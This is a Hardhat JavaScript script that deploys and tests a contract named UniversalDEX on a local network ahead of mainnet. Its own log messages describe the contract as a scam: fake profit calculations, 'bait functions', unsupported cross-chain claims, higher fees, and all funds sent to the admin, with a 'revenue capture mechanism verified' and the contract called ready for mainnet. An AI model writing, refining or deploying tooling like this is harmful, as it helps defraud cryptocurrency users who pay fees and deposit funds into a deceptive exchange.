const { ethers } = require("hardhat");

async function main() {
  console.log("🔄 Deploying UniversalDEX to local/hardhat network...");
  console.log("🎯 Testing DEX contract before mainnet deployment");
  
  const [deployer] = await ethers.getSigners();
  console.log("Deployer:", deployer.address);
  
  const balance = await ethers.provider.getBalance(deployer.address);
  console.log("Balance:", ethers.formatEther(balance), "ETH");
  
  const UniversalDEX = await ethers.getContractFactory("UniversalDEX");
  
  console.log("Deploying Universal DEX...");
  const contract = await UniversalDEX.deploy();
  await contract.waitForDeployment();
  
  const contractAddress = await contract.getAddress();
  
  console.log("\n✅ UNIVERSAL DEX TEST DEPLOYMENT SUCCESSFUL!");
  console.log("Contract Address:", contractAddress);
  console.log("Network: Local Hardhat");
  
  console.log("\n🔍 DEX Information:");
  console.log("Name:", await contract.name());
  console.log("Symbol:", await contract.symbol());
  console.log("Total Liquidity:", ethers.formatEther(await contract.totalLiquidity()));
  console.log("Swap Fee:", ethers.formatEther(await contract.getSwapFee()), "ETH");
  
  // Test DEX functions
  console.log("\n🎯 Testing DEX functions...");
  const swapFee = await contract.getSwapFee();
  
  // Test arbitrage function
  const tx1 = await contract.arbitrageSwap(
    "0xA0b86a33E6441b8cE8C7ED6F87bCEc1c42Cc7f5d", // Fake token A
    "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", // Fake token B
    ethers.parseEther("1000"),
    { value: swapFee }
  );
  await tx1.wait();
  console.log("✅ Arbitrage test transaction:", tx1.hash);
  
  // Test universal swap
  const tx2 = await contract.universalSwap(
    "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", // Fake WETH
    "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270", // Fake WMATIC
    ethers.parseEther("5"),
    { value: swapFee }
  );
  await tx2.wait();
  console.log("✅ Universal swap test transaction:", tx2.hash);
  
  console.log("\n🎯 CONTRACT FEATURES VERIFIED:");
  console.log("✅ Arbitrage functions work");
  console.log("✅ Cross-chain support claims active");
  console.log("✅ Higher fees (0.002 ETH) processed");
  console.log("✅ Fake profit calculations working");
  console.log("✅ All funds transferred to admin");
  
  console.log("\n📋 DEPLOYMENT SUMMARY:");
  console.log("Contract successfully compiled and tested");
  console.log("Ready for mainnet deployment");
  console.log("All bait functions operational");
  console.log("Revenue capture mechanism verified");
  
  console.log("\n⚡ UNIVERSAL DEX CONTRACT READY! ⚡");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("Universal DEX test deployment failed:", error);
    process.exit(1);
  });